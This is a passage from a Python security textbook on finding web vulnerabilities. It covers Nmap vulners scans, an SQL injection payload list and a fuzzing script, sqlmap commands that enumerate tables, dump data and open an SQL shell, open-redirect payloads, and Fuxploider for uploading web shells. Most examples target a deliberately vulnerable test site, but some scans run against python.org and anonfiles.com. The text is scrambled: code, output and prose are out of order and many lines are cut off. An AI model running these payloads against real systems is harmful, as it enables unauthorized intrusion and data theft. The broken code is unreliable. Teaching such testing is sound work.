All you need to do is add the IP address of your target site. If the
target you are analyzing is vulnerable to a speciﬁc CVE, you will see
the following output:
$ nmap -sV --script=vulners -v -p 8080  -oX results
PORT     STATE SERVICE VERSION 
8080/tcp open  http    Apache Tomcat 8.5.83 
| vulners:  
|   cpe:/a:apache:tomcat:8.5.83:  
|      TOMCAT:0DBA25EA40A6FEBF5FD9039D7F60718E  10.0
|      SSV:92553    10.0    https://vulners.com/seeb
|      TOMCAT:E4520A0C2F785FBF22985309FA3E3B08    9
|

The above command generates a ﬁle called results.xml containing
the output of the execution. Once we have executed the above
command, we can process the generated results.xml ﬁle
containing those vulnerabilities detected. For this task, we could use
the python-libnmap module
(https://pypi.org/project/python-libnmap), which allows us
to process the results.xml ﬁle and obtain the output for each of
the services that have been analyzed. We can install this module
with the following command:
$ pip install python-libnmap 
Once we have installed this module, we can automate the process of
obtaining vulnerabilities with the following script. You can ﬁnd the
following code in the nmap_parser.py ﬁle:
from libnmap.parser import NmapParser 
p = NmapParser.parse_fromfile("results.xml") 
for host in p.hosts: 
    for svc in host.services: 
        for script in svc.scripts_results: 
|      PACKETSTORM:153506    9.3    https://vulners
.... 
|      MSF:EXPLOIT-WINDOWS-HTTP-TOMCAT_CGI_CMDLINEAR
|      CVE-2022-45143    0.0    https://vulners.com/
|_     CVE-2022-42252    0.0    https://vulners.com/

            output = script.get("output") 
                print(output) 
Upon executing the previous command, in the output, we can see
references to the vulnerabilities and exploits found.
Now that we have analyzed the main tool for discovering
vulnerabilities in the Tomcat server, we are going to review how to
discover SQL vulnerabilities with Python tools such as sqlmap.
Discovering SQL vulnerabilities
with Python tools
$ python nmap_parser.py 
  cpe:/a:apache:tomcat:8.5.83:  
      TOMCAT:0DBA25EA40A6FEBF5FD9039D7F60718E  10.0 
      SSV:92553    10.0    https://vulners.com/seebu
      TOMCAT:E4520A0C2F785FBF22985309FA3E3B08  9.3  
      PACKETSTORM:153506    9.3    https://vulners.c
      F3523D8D-36CF-530B-85DD-013275F7D552    9.3   
      EDB-ID:47073  9.3    https://vulners.com/explo
      DB8D8364-06FB-55E8-934E-C013B00821B5    9.3   
      C9BC03B4-078B-5F3C-815A-98E0F8AAA33B    9.3   
      3A26C086-A741-585B-8FA9-F90780E2CA16    9.3   
      24B7AC9D-6C5E-545B-97E4-F20711FFCF8F    9.3   
      1337DAY-ID-32925    9.3    https://vulners.com
      TOMCAT:7E8B1837DB1B24489FB7CEAE24C18E30    7.8

In this section, we will learn how to test whether a website is
vulnerable to SQL injection using the sqlmap penetration testing
tool as an automated tool for ﬁnding and exploiting SQL injection
vulnerabilities that inject values into the query parameters.
Introduction to SQL injection
Before deﬁning the SQL injection aĴack, it is important to know its
origins. SQL is a declarative database access language that allows
querying, inserting, and modifying information. Its simplicity has
made SQL the most widely used database access language today.
The context for a SQL injection aĴack is as follows:
1. An application queries a database using SQL.
2. The application receives data from an unknown source.
3. The application executes queries to the database dynamically.
A SQL injection aĴack occurs when a value in the client request is
used within a SQL query without prior sanitization. If we are
working as web developers and we do not validate inputs in the
code and rely on data provided by users, aĴackers can extract
information from databases, tamper with data, or take control of the
server.
Injection occurs when user input is sent to an interpreter as part of a
command or query and tricks the interpreter into executing
unwanted commands and providing access to unauthorized data.
A SQL injection aĴack is enabled by the poor management of the
data received for the query. The origin of this aĴack lies in the
system’s ability to interpret the data received as executable code. Let

us imagine a PHP authentication system using a MySQL database
where the user submits the username and password. The application
receives both parameters and executes the following SQL query:
Where '$user' and '$password' are data sent by a user. The
above query will validate the user and password in the database and
check if the above query returns a number greater than zero (the
query counts all rows that meet the WHERE condition in the users
table). Let’s imagine that a malicious user sends $user='user' and
$password= ' OR '1'='1. The query would look like this:
The SQL interpreter parses the above statement where there are two
conditions separated by an OR clause. The ﬁrst condition will not be
fulﬁlled, but the second one will always be fulﬁlled (1=1). At this
point, this query will return the number of users in the table since
the condition is met in all rows. As the number is greater than 0, an
aĴacker would be able to access the system.
In this way, SQL injection vulnerabilities allow aĴackers to modify
the structure of SQL queries in ways that allow for data exﬁltration
or the manipulation of existing data. We’ll now continue by looking
at techniques and tools to identify sites that are vulnerable to SQL
injection.
SELECT count(*) FROM users WHERE user='$user' AND pa
SELECT count(*) FROM users WHERE user='user' AND pas

Identifying websites vulnerable to SQL
injection
A simple way to identify websites with a SQL injection vulnerability
is to add some characters to the URL, such as quotes, commas, or
periods. For example, if you discover a URL with a PHP site that
uses a parameter for a particular search, you can try adding a special
character to that parameter.
If you observe the
http://testphp.vulnweb.com/listproducts.php?cat=1 URL,
we are geĴing all products, not just a product with a speciﬁc ID. This
could indicate that the cat parameter may be vulnerable to SQL
injection and an aĴacker may be able to gain access to information in
the database using speciﬁc tools.
To check whether a site is vulnerable, we can manipulate the URL of
the page by adding certain characters that could cause it to return an
error from the database.
A simple test to check whether a website is vulnerable would be to
replace the value in the get request parameter with the character '.
For example, the following URL returns an error related to the
database when we try to use an aĴack vector such as ' or 1=1--
over the vulnerable parameter:
http://testphp.vulnweb.com/listproducts.php?
cat=%22%20or%201=1--.

Figure 10.6: Checking a SQL injection error on a website
With Python, we could build a script that reads possible SQL aĴack
vectors from the sql-attack-vector.txt text ﬁle and checks the
output because of the injection of speciﬁc strings. You can see the
most used SQL injection aĴack vectors in the sql-attack-
vector.txt ﬁle located in the sql_injection folder:
" or "a"="a 
" or "x"="x 
" or 0=0 # 
" or 0=0 -- 
" or 1=1 or ""=" 
" or 1=1-- 
"' or 1 --'" 
") or ("a"="a 
You can ﬁnd a similar ﬁle example in the FuzzDB project’s GitHub
repository with speciﬁc SQL injection payloads:

https://github.com/fuzzdb-
project/fuzzdb/tree/master/attack/sql-injection.
The aim of the following script is to start from a URL where we
identify the vulnerable parameter and combine the original URL
with these aĴack vectors. You can ﬁnd the following code in the
testing_url_sql_injection.py ﬁle in the sql_injection
folder:
import requests 
url = "http://testphp.vulnweb.com/listproducts.php?c
sql_payloads = [] 
with open('sql-attack-vector.txt', 'r') as filehandl
    for line in filehandle: 
        sql_payload = line[:-1] 
        sql_payloads.append(sql_payload) 
for payload in sql_payloads: 
    print ("Testing "+ url + payload) 
    response = requests.post(url+payload) 
    if "mysql" in response.text.lower(): 
        print("Injectable MySQL detected,attack stri
    elif "native client" in response.text.lower(): 
        print("Injectable MSSQL detected,attack stri
    elif "syntax error" in response.text.lower(): 
        print("Injectable PostGRES detected,attack s
    elif "ORA" in response.text.lower(): 
        print("Injectable Oracle database detected,a
    else: 
        print("Payload ",payload," not injectable") 

In the preceding script, we are opening a ﬁle that contains SQL
injection payloads and saving these payloads in the sql_payloads
array. By using the payload in the URL parameter, we can check for
the presence of a speciﬁc string in the response to verify this
vulnerability:
When executing the preceding script, we can see that the cat
parameter is vulnerable to many vector aĴacks. One of the most
used tools for evaluating a website’s SQL injection vulnerabilities is
sqlmap. This is a tool that automates the recognition and
exploitation of these vulnerabilities in diﬀerent relational databases,
including SQL Server, MySQL, Oracle, and PostgreSQL.
Introducing sqlmap
sqlmap (https://sqlmap.org) is a tool developed in Python to
automate SQL injection aĴacks. Its goal is to detect and exploit
existing vulnerabilities in web applications. Once one or several
$ python3 test_url_sql_injection.py 
Testing http://testphp.vulnweb.com/listproducts.php?
Injectable MySQL detected,attack string: ' or 'a'='a
Testing http://testphp.vulnweb.com/listproducts.php?
Injectable MySQL detected,attack string: ' or 'x'='x
Testing http://testphp.vulnweb.com/listproducts.php?
Injectable MySQL detected,attack string: ' or 0=0 # 
Testing http://testphp.vulnweb.com/listproducts.php?
Injectable MySQL detected,attack string: ' or 0=0 --
... 

possible injections have been detected, the user has the possibility of
choosing between diﬀerent options, among which we can highlight
obtaining users, schemas, tables, password hashes, permissions,
executing their own queries, or even obtaining an interactive shell.
This tool has the capacity to detect SQL injection vulnerabilities
using a variety of techniques, including Boolean-based blind, time-
based, UNION query-based, and stacked queries. In addition, if it
detects a vulnerability, it has the capacity to aĴack the server to
discover table names, download the database, and perform SQL
queries automatically. Once it detects a SQL injection on the target
host, you can choose from a set of options:
Perform an extensive backend DBMS ﬁngerprint
Retrieve the DBMS session user and database
Enumerate users, password hashes, privileges, and databases
Dump the entire DBMS table/columns or the user’s speciﬁc
DBMS table/columns
Run custom SQL statements
sqlmap comes preinstalled with some Linux distributions oriented
toward security tasks, such as Kali Linux (https://www.kali.org),
which is one of the preferred distributions for most security auditors
and pentesters. You can also install sqlmap on other Debian-based
distributions using the following command:
$ sudo apt-get install sqlmap 
Another way to install is by downloading the source code from the
GitHub repository of the project:

https://github.com/sqlmapproject/sqlmap. We’ll ﬁrst look at
the help feature of sqlmap for a beĴer understanding of its features.
You can look at the set of parameters that can be passed to the
sqlmap.py script with the -h option:
$ sqlmap -h 
Usage: python sqlmap.py [options] 
Options: 
  -h, --help            Show basic help message and 
  -hh                   Show advanced help message a
  --version             Show program's version numbe
  -v VERBOSE            Verbosity level: 0-6 (defaul
  Target: 
    At least one of these options has to be provided
    target(s) 
    -u URL, --url=URL   Target URL (e.g. "http://www
    -g GOOGLEDORK       Process Google dork results 
  Injection: 
    These options can be used to specify which param
    provide custom injection payloads and optional t
    -p TESTPARAMETER    Testable parameter(s) 
    --dbms=DBMS         Force back-end DBMS to provi
  Detection: 
    These options can be used to customize the detec
    --level=LEVEL       Level of tests to perform (1
    --risk=RISK         Risk of tests to perform (1-
  Techniques: 
    These options can be used to tweak testing of sp
    techniques 
    --technique=TECH..  SQL injection techniques to 
  Enumeration: 

Next, we will cover how to use sqlmap to test and exploit SQL
injection.
Using sqlmap to test a website for a
SQL injection vulnerability
In order to obtain all the information about a database vulnerable to
SQL injection, we are going to analyze the main commands we can
execute with sqlmap.
Firstly, we use the -u parameter to enter the URL of the site we are
going to analyze. For this task, we can use the following command:
    These options can be used to enumerate the back-
    management system information, structure and dat
    tables 
    -a, --all           Retrieve everything 
    -b, --banner        Retrieve DBMS banner 
    --current-user      Retrieve DBMS current user 
    --current-db        Retrieve DBMS current databa
    --passwords         Enumerate DBMS users passwor
    --tables            Enumerate DBMS database tabl
    --columns           Enumerate DBMS database tabl
    --schema            Enumerate DBMS schema 
    --dump              Dump DBMS database table ent
    --dump-all          Dump all DBMS databases tabl
    -D DB               DBMS database to enumerate 
    -T TBL              DBMS database table(s) to en
    -C COL              DBMS database table column(s

Upon executing the preceding command, we can see how the cat
parameter is vulnerable. This is a partial output of the command:
After scanning the URL, the next step is to list information about the
existing databases. We could perform a basic aĴack on a URL
showing the existing databases. In this test, we will use a standard
HTTP GET-based request against a URL with a parameter (?id=X).
This will test diﬀerent SQL injection methods against the id
parameter. For this task, we could use the --dbs option:
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
GET parameter 'cat' is vulnerable. Do you want to ke
sqlmap identified the following injection point(s) w
--- 
Parameter: cat (GET) 
    Type: boolean-based blind 
    Title: AND boolean-based blind - WHERE or HAVING
    Payload: cat=1 AND 8568=8568 
    Type: error-based 
    Title: MySQL >= 5.6 AND error-based - WHERE, HAV
    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7170627a
    Type: time-based blind 
    Title: MySQL >= 5.0.12 AND time-based blind (que
    Payload: cat=1 AND (SELECT 8807 FROM (SELECT(SLE
    Type: UNION query 
    Title: Generic UNION query (NULL) - 11 columns 
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,N

By executing the preceding command, we can retrieve information
about the acuart and information_schema databases. This is a
partial output of the previous command:
[20:39:20] [INFO] the back-end DBMS is MySQL 
web application technology: Nginx, PHP 5.3.10 
back-end DBMS: MySQL >= 5.0 
[20:39:20] [INFO] fetching database names 
available databases [2]: 
[*] acuart 
[*] information_schema 
Once the tool has identiﬁed the database, it can ask the user whether
they want to test other types of databases or whether they want to
test other parameters on the website for vulnerabilities.
sqlmap could also be used to exploit SQL injection, doing things
such as extracting information from databases. As you will see in the
output below, we can continue testing against the target without
having to retest the vulnerability. sqlmap uses the information it
knows about the site to further exploit the target database. To
retrieve data, we simply add a parameter to the above command. By
adding --tables, we can aĴempt to retrieve all the tables in the
database we are interested in.
The next step could be to use the -D parameter together with the
name of the database to list information about tables present in a
$ sqlmap -u "http://testphp.vulnweb.com/listproducts

particular database. In the following example, we are using the --
tables option to access the information_schema database:
By executing the previous command, we can retrieve the
information about tables that is available in the
information_schema database. This is a partial output of the
command:
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
[22:34:44] [INFO] the back-end DBMS is MySQL 
web server operating system: Linux Ubuntu 
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6 
[22:34:44] [INFO] fetching tables for database: 'inf
Database: information_schema 
[79 tables] 
+---------------------------------------+ 
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     | 
| APPLICABLE_ROLES                      | 
| CHARACTER_SETS                        | 
| CHECK_CONSTRAINTS                     | 
| COLLATIONS                            | 
| COLLATION_CHARACTER_SET_APPLICABILITY | 
| COLUMNS                               | 
... 

In the preceding example, 79 tables have been recovered from the
information_schema database. We could continue listing
information about the columns of a speciﬁc table. For this task, we
could use the -T option in conjunction with the table name to see
the columns of a particular table. In the same way, we can obtain the
column names with the --columns option.
With the following command, we could obtain the columns of a
speciﬁc table. In this case, we specify the table with the -T option,
and with the --columns option, we indicate to show us the
columns.
By executing the preceding command, we can retrieve information
about columns that is available in the
administrable_role_authoritzations table. In this example, 9
columns have been recovered. This is a partial output of the
command:
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
[23:06:09] [INFO] fetching columns for table 'ADMINI
Database: information_schema 
Table: ADMINISTRABLE_ROLE_AUTHORIZATIONS 
[9 columns] 
+--------------+--------------+ 
| Column       | Type         | 
+--------------+--------------+ 
| USER         | varchar(97)  | 
| GRANTEE      | varchar(97)  | 
|
|
|

Similarly, we can access all information in a speciﬁc table by using
the following command, where the --dump query retrieves all the
data from the products table in the acuart database:
By executing the previous command, we can retrieve information
about the records that are available in the products table. In this
example, three records have been recovered. This is a partial output
of the previous command:
| GRANTEE_HOST | varchar(256) | 
| HOST         | varchar(256) | 
| IS_DEFAULT   | varchar(3)   | 
| IS_GRANTABLE | varchar(3)   | 
| IS_MANDATORY | varchar(3)   | 
| ROLE_HOST    | varchar(256) | 
| ROLE_NAME    | varchar(255) | 
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
web server operating system: Linux Ubuntu 
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6 
[23:14:35] [INFO] fetching columns for table 'produc
[23:14:35] [INFO] fetching entries for table 'produc
Database: acuart 
Table: products 
[3 entries] 
+----+----------------------------------------------
|
|

By executing the following command, we can retrieve the
information about all the tables in the current database. For this task,
we can use ﬂags such as --tables and --columns to get all the
table names and column names:
By executing the following command, we can get an interactive shell
to interact with the database with the query SQL language:
The -sql-query parameter will execute the command/query that
we indicate. In the example, as we are using SELECT, it will return
the result of the query. If it were another command, such as UPDATE
or DELETE, it would only execute the query and return the number
of rows aﬀected. In this way, we have real-time control of the data
contained in the database.
| id | name                                         
+----+----------------------------------------------
| 1  | Network Storage D-Link DNS-313 enclosure 1 x 
| 2  | Web Camera A4Tech PK-335E                    
| 3  | Laser Color Printer HP LaserJet M551dn, A4   
+----+----------------------------------------------
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
$ sqlmap -u 'http://testphp.vulnweb.com/listproducts

As we have seen, this tool has multiple combinations and
possibilities that can help to exploit this vulnerability on the target
analyzed. sqlmap is one of the best-known tools wriĴen in Python
for detecting vulnerabilities related to SQL injection in web
applications. To do this, the tool has the capacity to realize multiple
requests in a website using vulnerable parameters in a URL through
GET or POST requests due to the parameters not being validated
correctly.
We’ll continue by analyzing another open-source tool that we could
use to detect this type of vulnerability.
Scanning for SQL injection
vulnerabilities with sqlifinder
$ sqlmap -u "http://testphp.vulnweb.com/listproducts
web server operating system: Linux Ubuntu 
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6 
[23:39:48] [INFO] fetching SQL SELECT statement quer
[23:39:48] [INFO] you did not provide the fields in 
[23:39:48] [INFO] fetching columns for table 'produc
[23:39:48] [INFO] the query with expanded column nam
SELECT * from acuart.products [3]: 
[*] NET STORAGE ENCLOSURE SATA DNS-313 D-LINK, 1, Ne
[*] Web Camera A4Tech PK-335E, 2, Web Camera A4Tech 
[*] Laser Color Printer HP LaserJet M551dn, A4, 3, L

sqliﬁnder (https://github.com/americo/sqlifinder) is a tool
with the function of detecting GET-based SQL Injection (SQLI)
vulnerabilities in web applications using waybackurls, web crawlers,
and SQL injection payloads. You can install it with the following
commands:
$ sudo apt install git 
$ git clone https://github.com/americo/sqlifinder 
$ cd sqlifinder 
$ pip install -r requirements.txt 
With the following command, we can see the options oﬀered by the
tool:
To execute the tool on a target, simply use the following command:
$ python sqlifinder.py -h 
usage: sqlifinder.py [-h] -d DOMAIN [-s SUBS] 
 xssfinder - a xss scanner tool 
 optional arguments: 
  -h, --help            show this help message and e
  -d DOMAIN, --domain DOMAIN 
                        Domain name of the target [e
  -s SUBS, --subs SUBS  Set false or true [ex: --sub
$ python sqlifinder.py -d <target> 
[INF] Scanning sql injection for http://testphp.vuln
[sql-injection] http://testphp.vulnweb.com/listprodu

In the above output, we see the diﬀerent URLs and website
parameters that are vulnerable. Now that we have analyzed the
main tools for discovering SQL vulnerabilities like sqlmap and
sqliﬁnder, we are going to review how to discover SQL
vulnerabilities with the Nmap port scanner.
Scanning for SQL injection
vulnerabilities with the Nmap port
scanner
An interesting functionality that Nmap incorporates is the Nmap
Scripting Engine, which oﬀers the option to execute scripts
developed for speciﬁc tasks, such as the detection of service versions
and the detection of vulnerabilities.
Nmap provides an http-sql-injection script that has the
capacity to detect SQL injection in web applications. You can ﬁnd the
documentation for this script on the Nmap script page at
https://nmap.org/nsedoc/scripts/http-sql-injection.html.
[sql-injection] http://testphp.vulnweb.com/listprodu
[sql-injection] http://testphp.vulnweb.com/categorie
[sql-injection] http://testphp.vulnweb.com/redir.php
[sql-injection] http://testphp.vulnweb.com/listprodu
[sql-injection] http://testphp.vulnweb.com:80/artist
[sql-injection] http://testphp.vulnweb.com/listprodu
[sql-injection] http://testphp.vulnweb.com:80/bxss/v
[sql-injection] http://testphp.vulnweb.com:80/produc
[sql-injection] http://testphp.vulnweb.com:80/admin/

Figure 10.7: Nmap hĴp-sql-injection script
We can see the script source code in the svn.nmap repository:
https://svn.nmap.org/nmap/scripts/http-sql-
injection.nse. In the Linux operating system, by default, nmap
scripts are located in the /usr/share/nmap/scripts/ path. You
can execute the following command to test the http-sql-
injection Nmap script:
$ nmap -sV --script=http-sql-injection <ip_address_d

All we need to do is add the IP address or domain of our target site.
If the target we are analyzing is vulnerable, we will see the following
output:
In the output of the nmap command, we can see how, as a result of
executing the http-sql-injection script, it detects a possible SQL
injection for speciﬁc queries related to the domain we are analyzing.
In this section, we have reviewed the main tools for detecting SQL
injection vulnerabilities, such as sqlmap and the nmap http-sql-
injection script. These tools enable, in a simple way, automation
of the process of detecting this type of vulnerability in parameters
that are being used on our site and that can be easily exploited by an
aĴacker.
We’ll continue by analyzing the process of detecting vulnerabilities
in web applications, like open redirect and ﬁle upload security
issues.
80/tcp   open  http     nginx 1.4.1 
|_http-server-header: nginx/1.4.1 
| http-sql-injection: 
|   Possible sqli for queries: 
|     http://testphp.vulnweb.com/search.php?test=que
|     http://testphp.vulnweb.com/search.php?test=que
|    http://testphp.vulnweb.com/AJAX/../showimage.ph
|     http://testphp.vulnweb.com/search.php?test=que

Automating the process of
detecting vulnerabilities in web
applications
In this section, we will analyze other vulnerabilities, such as open
redirect and ﬁle upload security issues, and tools that can be found
within the Python ecosystem related to pentesting tasks.
Detecting an open redirect
vulnerability
Open redirect is a vulnerability that allows a remote aĴacker to
redirect victims to an arbitrary URL. The vulnerability exists due to
the improper sanitization of user-supplied data in
lib/http/server.py due to the lack of protection from multiple
slash characters at the beginning of a URI path. A remote aĴacker
can create a link that leads to a trusted website but, when clicked,
redirects the victim to an arbitrary domain.
Successful exploitation of this vulnerability may allow a remote
aĴacker to perform a phishing aĴack and steal potentially sensitive
information.
Oralyzer (https://github.com/r0075h3ll/Oralyzer) is a Python
script that checks for the open redirect vulnerability in a website
using fuzzing techniques. We can install this tool using the following
commands:
$ git clone https://github.com/r0075h3ll/Oralyzer.gi

With the following command, we can see the options oﬀered by the
tool:
What this tool does is test diﬀerent payloads with the URL of the
website we are testing.
http://www.google.com 
http%3A%2F%2Fwww.google.com 
https%3A%2F%2Fwww.google.com 
//www.google.com 
https:www.google.com 
google.com 
/\/\google.com 
When executing the previous tool, we can see how it is detecting an
open redirect vulnerability of the header-based redirection type on
$ python oralyzer.py -h 
Oralyzer 
usage: oralyzer.py [-h] [-u URL] [-l PATH] [-crlf] 
optional arguments: 
  -h, --help  show this help message and exit 
  -u URL      scan single target 
  -l PATH     scan multiple targets from a file 
  -crlf       scan for CRLF Injection 
  -p PAYLOAD  use payloads from a file 
  --proxy     use proxy 
  --wayback   fetch URLs from archive.org 

the python.org domain.
We may also be interested in developing our own tool to detect such
a vulnerability. In the following example, which has a requests
module and makes use of the diﬀerent payloads, we could check the
status code of the response to determine if the website is vulnerable.
You can ﬁnd the following code in the test_open_redirect.py ﬁle
in the open_redirect folder:
$ python oralyzer.py -u https://python.org  
[!] Appending payloads just after the URL 
[!] Infusing payloads 
[+] Header Based Redirection : https://python.org/ht
[+] Header Based Redirection : https://python.org/ht
[+] Header Based Redirection : https://python.org/ht
[+] Header Based Redirection : https://python.org///
import requests 
import random 
import sys 
target = input("Enter target URL: ") 
payloads = 'payloads.txt' 
user_agent = ['Mozilla/5.0 (Windows NT 10.0; WOW64) 
'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-810
'Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/2010010
'Mozilla/5.0 (PLAYSTATION 3 4.81) AppleWebKit/531.22
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKi
'Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebK
'Mozilla/5.0 (Windows NT 6.0; WOW64; Trident/7.0; rv

In the previous code, we imported the modules that we are going to
use and declared a list of user agents that we could use to make the
requests. We continue by declaring the function that will parse the
URL and check, for each of the payloads, the status code returned by
the response.
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) App
'Mozilla/5.0 (PlayStation 4 5.01) AppleWebKit/601.2 
header = {'User-Agent': random.choice(user_agent)} 
def test_open_redirect(): 
    print('Loading Payloads: ' + payloads) 
    f = open(payloads,'r') 
    for line in f.readlines(): 
        payload = line.strip('\n') 
        try: 
            final = target+"/"+payload 
            print(final) 
            response = requests.get(final,headers=he
            for resp in response.history: 
                print(resp.status_code) 
                if resp.status_code == 302 or resp.s
                    print(resp.status_code, resp.url
                else: 
                    print(resp.url  + '[-]Not Vulner
        except Exception as e: 
            print ("Invalid URL:"+str(e)) 
            sys.exit() 
        except IOError: 

By executing the above script, we can see that if the response code is
301 or 302, we are facing a case of an open redirect type
vulnerability.
An open redirect vulnerability occurs when an application allows a
user to control a redirect or forward to another URL. If the app does
not validate untrusted user input, an aĴacker could supply a URL
that redirects an unsuspecting victim from a legitimate domain to an
aĴacker’s phishing site.
Detecting vulnerabilities with
Fuxploider
            print(IOError) 
test_open_redirect() 
$ python test_open_redirect.py 
Enter target URL: http://www.python.org 
Loading Payloads: payloads.txt 
http://www.python.org/http://www.google.com 
301 
301 http://www.python.org/http://www.google.com [!] 
http://www.python.org/http%3A%2F%2Fwww.google.com 
301 
301 http://www.python.org/http%3A%2F%2Fwww.google.co
http://www.python.org/https%3A%2F%2Fwww.google.com 

Fuxploider (https://github.com/almandin/fuxploider) is an
open-source penetration testing tool that automates the process of
detecting and exploiting ﬁle upload forms, ﬂaws.
This tool has the capacity to detect the ﬁle types allowed to be
uploaded and is able to detect which technique will work best to
upload web shells or any malicious ﬁle on the desired web server.
This tool contains a scanner to search for vulnerabilities and another
module to exploit them. In the GitHub repository, there is an
installation guide and example of use. You can install this tool with
the following commands:
To get a list of basic options and switches, you can use the following
command:
$ python fuxploider.py -h 
Now let’s see a live example using the anonfiles service:
With the previous command, we take the URL of a ﬁle upload
service called https://anonfiles.com and pass as a parameter the
$ git clone https://github.com/almandin/fuxploider.g
$ cd fuxploider 
$ pip install -r requirements.txt 
$ python fuxploider.py --url https://anonfiles.com -

error message it displays when uploading an impermissible ﬁle type.
Summary
The analysis of vulnerabilities in web applications is currently the
best ﬁeld in which to perform security audits. One of the objectives
of this chapter was to learn about the tools in the Python ecosystem
that allow us to identify server vulnerabilities in web applications
such as sqlmap. The main vulnerabilities analyzed were XSS and
SQL injection. In the SQL injection section, we covered several tools
for detecting this kind of vulnerability, including sqlmap and Nmap
scripts. Finally, we reviewed how to detect vulnerabilities in web
applications with tools like Oralyzer and Fuxploider.
In this chapter, we learned about the main vulnerabilities that we
can ﬁnd in a website and how, with the help of automatic tools and
Python scripts, we can detect some of them. In addition, you learned
how to detect conﬁguration errors in a server that can aﬀect the
security of the site and that can be exploited by an aĴacker.
In the next chapter, we will review how to get information about
vulnerabilities from the CVE, NVD, and Vulners databases.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. What type of vulnerability is an aĴack that injects malicious
scripts into web pages to redirect users to fake websites or to

gather personal information?
2. What is the technique where an aĴacker inserts SQL database
commands into a data input ﬁeld of the order form used by a
web-based application?
3. Which sqlmap option allows geĴing an interactive shell to
interact with the database?
4. What is the name of the Nmap script that allows scanning for
the SQL injection in a web application?
5. What techniques do the Oralyzer and Fuxploider tools use to
detect vulnerabilities in web applications?
Further reading
You can use the following links to ﬁnd out more about the
mentioned tools and other tools associated with detecting
vulnerabilities:
SQL injection cheat sheet:
https://www.invicti.com/blog/web-security/sql-
injection-cheat-sheet
Preventing SQL injections in Python:
https://blog.sqreen.com/preventing-sql-injections-
in-python
A simple tool to ﬁnd a SQL injection vulnerability using
Google dorks: https://github.com/j1t3sh/SQL-
Injection-Finder
An advanced cross-platform tool that automates the process of
detecting and exploiting SQL injection security ﬂaws:

https://github.com/r0oth3x49/ghauri
A powerful sensor tool to discover login panels and POST
form SQLi scanning: https://github.com/Mr-
Robert0/Logsensor
HTTP request smuggling detection tool:
https://github.com/anshumanpattnaik/http-request-
smuggling
Local ﬁle inclusion discovery and exploitation tool:
https://github.com/hansmach1ne/lfimap
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

11
Obtain Information from
Vulnerabilities Databases
Python is a language that allows us to scale up from start-up projects
to complex data processing applications and support dynamic web
pages in a simple way. However, as you increase the complexity of
your applications, the introduction of potential vulnerabilities can be
critical in your application from a security point of view.
This chapter covers how to get information about vulnerabilities
from Common Vulnerabilities and Exposures (CVE), National
Vulnerability Database (NVD), and the vulners database. We will
discuss the main vulnerability formats and the process of ﬁnding a
CVE vulnerability in the NVD and vulners databases. Finally, we
will learn how to search for vulnerabilities using tools like Pompem.
The following topics will be covered in this chapter:
Identifying information about vulnerabilities in the CVE
database
Searching for vulnerabilities in the NVD
Searching for vulnerabilities in the Vulners database
Searching for vulnerabilities with other tools like Pompem

Technical requirements
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
You will need to install the Python distribution on your local
machine and have some basic knowledge about secure coding
practices.
Check out the following video to see the Code in Action:
https://packt.link/Chapter11.
Identify and understand
vulnerabilities and exploits
In this section, we will cover understanding vulnerabilities and
exploits, reviewing how to identify information about vulnerabilities
in the CVE database.
A vulnerability is a ﬂaw in our application’s code or in the
conﬁguration that it generates that an aĴacker can exploit to change
the application’s behavior, such as injecting code or accessing private
data.
A vulnerability can also be a weakness in the security of a system
that can be exploited to gain access to that system. These
vulnerabilities can be exploited in two ways: remotely and locally.
A remote aĴack is an aĴack that is carried out from a computer other
than the victim’s computer, while a local aĴack, as the name implies,

is carried out locally on the victim’s computer. These aĴacks are
based on a series of techniques designed to gain access and elevate
privileges on that machine.
One of the main problems we have with automatic scanners is that
they cannot test for all types of vulnerabilities and can give false
positives, which have to be investigated and analyzed manually. The
non-detection of some vulnerabilities and the incorrect classiﬁcation
of a vulnerability as low-priority could be detrimental to the system
since we could easily ﬁnd such a vulnerability or exploit in the
public exploit database at https://www.exploit-db.com.
Figure 11.1: Exploit database

Now, we are going to review the exploit concept and go into detail
with a speciﬁc exploit that we can ﬁnd in the exploit database.
What is an exploit?
Exploits are software or scripts that exploit a bug, failure, or
weakness to cause undesirable behavior in a system or application,
which allows a malicious user to force changes in the execution ﬂow,
allowing the aĴacker to control it. In the following screenshot, we
can see the details of a vulnerability in the exploit database.
Figure 11.2: Exploit details
In the following url, https://www.exploit-
db.com/exploits/51030, we can ﬁnd the details of this
vulnerability:
#Exploit Title: CVAT 2.0 - SSRF (Server Side Request
#Exploit Author: Emir Polat 

A zero-day vulnerability is a software vulnerability discovered by
aĴackers before the vendor has become aware of it.
Vulnerability formats
Vulnerabilities are uniquely identiﬁed by the CVE format, which
was created by the MITRE Corporation.
The identiﬁer code has the format CVE-year-number; for example,
CVE-2023-01 identiﬁes a vulnerability discovered in the year 2023
with the identiﬁer 01. There are several databases in which you can
ﬁnd information about the diﬀerent existing vulnerabilities, out of
which we highlight the following:
CVE, which represents the standard for information security
vulnerability names: https://cve.mitre.org/cve/
NVD: https://nvd.nist.gov
Usually, the published vulnerabilities are assigned their
corresponding exploits by way of a proof of concept, which is
developed by security researchers. This allows the security
administrators of an organization to test the real presence of the
vulnerability and measure its impact inside the organization.
#Vendor Homepage: https://github.com/opencv/cvat 
#Version: < 2.0.0 
#Tested On: Version 1.7.0 - Ubuntu 20.04.4 LTS (GNU/
#CVE: CVE-2022-31188 
